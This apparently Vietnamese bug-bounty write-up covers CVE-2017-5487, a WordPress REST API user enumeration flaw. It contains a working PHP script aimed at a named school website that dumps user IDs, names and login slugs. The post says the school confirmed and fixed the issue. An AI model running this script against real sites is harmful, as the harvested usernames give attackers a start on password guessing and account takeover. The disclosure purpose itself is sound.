---
title: Tiền thưởng Tiết Lộ Người Dùng WordPress (CVE-2017-5487)
date: 25/03/2022
layout: single
header:
  teaser: /assets/images/wordpress.png
---

## Mô Tả

Tiết lộ các tài khoản WordPress thông qua `/wp-json/wp/v2/users/` sử dụng php để dump tên tài khoản, và họ tên đăng bài

Việc tiết lộ thông tin nhạy cảm cho CVE-2017-5487

wp-gồm/rest-api/endpoints/class-wp-rest-users-controller.php trong quá trình triển khai API REST trong WordPress 4.7 trước 4.7.1 , điều này cho phép kẻ tấn công từ xa lấy được thông tin nhạy cảm thông qua yêu cầu wp-json/wp/v2/users.

Mức độ lỗ hổng: 5,3 TRUNG BÌNH

## Hướng dẫn

Thay đổi url trong đoạn code dưới đây

```shell
php file.php
```

[![Language](https://img.shields.io/badge/Lang-php-blue.svg)](https://www.php.net/)

```php
#!usr/bin/php
<?php
header ('Content-type: text/html; charset=UTF-8');


$url= "https://namsaigon.edu.vn/"; # url
$payload="/wp-json/wp/v2/users/";
$urli = file_get_contents($url.$payload);
$json = json_decode($urli, true);
if($json){
    echo "*-----------------------------*\n";
foreach($json as $users){
    echo "[*] ID :  |" .$users['id']     ."|\n";
    echo "[*] Name: |" .$users['name']   ."|\n";
    echo "[*] User :|" .$users['slug']   ."|\n";
    echo "\n";
}echo "*-----------------------------*";}
else{echo "[*] No user";}


?>

```

![](https://www8.0zz0.com/2021/07/15/15/128822449.jpg)

## Kết quả

Lỗ hổng đã được xác nhận qua mail của trường và đã được Fix

![](https://www5.0zz0.com/2023/03/15/10/222638956.png)
